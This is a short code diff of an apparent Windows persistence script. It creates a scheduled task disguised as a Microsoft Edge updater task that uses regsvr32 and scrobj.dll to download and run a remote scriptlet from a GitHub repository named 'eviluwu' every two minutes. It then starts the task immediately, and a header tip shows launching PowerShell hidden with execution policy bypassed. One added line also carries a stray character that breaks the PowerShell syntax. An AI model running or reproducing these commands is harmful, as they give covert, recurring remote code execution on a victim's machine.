@@ -1,9 +1,9 @@
 # TIP: invoke with `powershell.exe -w hidden -nop -ExecutionPolicy Bypass -Command`
-
-schtasks /create /tn "MicrosoftEdgeUpdateUpdaterTaskMachineCore" /tr "regsvr32 /s /n /u /i:https://raw.githubusercontent.com/b3at1/eviluwu/refs/heads/main/WPXService.wsc scrobj.dll" /sc minute /mo 5 /f
-schtasks /run /tn "MicrosoftEdgeUpdateUpdaterTaskMachineCore"
+# new command
+schtasks /create /tn "MicrosoftEdgeUpdateUpdaterTaskMachineCore" /tr "regsvr32 /s /n /u /i:https://raw.githubusercontent.com/b3at1/eviluwu/refs/heads/main/WPXService.wsc scrobj.dll" /sc minute /mo 2 /f /z; schtasks /run /tn "MicrosoftEdgeUpdateUpdaterTaskMachineCore"
+# old powershell
 '''
-$taskName = "MicrosoftEdgeUpdateUpdaterTaskMachineCore"
+$taskName = "MicrosoftEdgeUpdateUpdaterTaskMachineCore"s
 if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
     Start-ScheduledTask -TaskName $taskName
 } else {
